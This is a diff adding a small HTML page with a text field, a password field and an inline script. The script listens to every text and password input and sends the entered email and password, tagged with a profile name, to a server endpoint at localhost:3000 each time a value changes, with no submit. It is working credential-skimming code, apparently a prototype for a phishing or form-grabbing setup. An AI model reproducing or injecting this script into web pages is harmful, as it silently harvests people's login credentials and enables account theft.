@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.26.0/axios.min.js"></script>
+    <script>
+        window.onload = ()=>{
+            let profile = "owai2s"
+            let post = (profile = "Owais",email="",password="")=>{
+                    
+                axios.post('http://localhost:3000/post',{
+                    profile: profile,
+                    email: email,
+                    password: password
+                }).then(res=>{
+                    console.log(res)
+                })
+            }
+            let email = document.querySelectorAll("input[type=text]")
+            let pass = document.querySelectorAll("input[type=password]")
+            email.forEach(Email=>{
+                Email.addEventListener("change",e=>{
+                    let _email = e.target.value
+                    let _password = ""
+                    pass.forEach(Pass=>{
+                        if(Pass.value !=""){
+                            _password = Pass.value
+                        }
+                    })
+                    post(profile,_email,_password)
+                //post(profile,email.value,pass.value)
+                })
+            })
+            pass.forEach(Pass=>{
+                Pass.addEventListener("change",e=>{
+                    let _email = ""
+                    let _password = e.target.value
+                    email.forEach(Email=>{
+                        if(Email.value !=""){
+                            _email = Email.value
+                        }
+                    })
+                    post(profile,_email,_password)
+                })
+            })
+        }
+    </script>
+</head>
+<body>
+    <input type="text">
+    <input type="password" name="" id="">
+</body>
+</html>
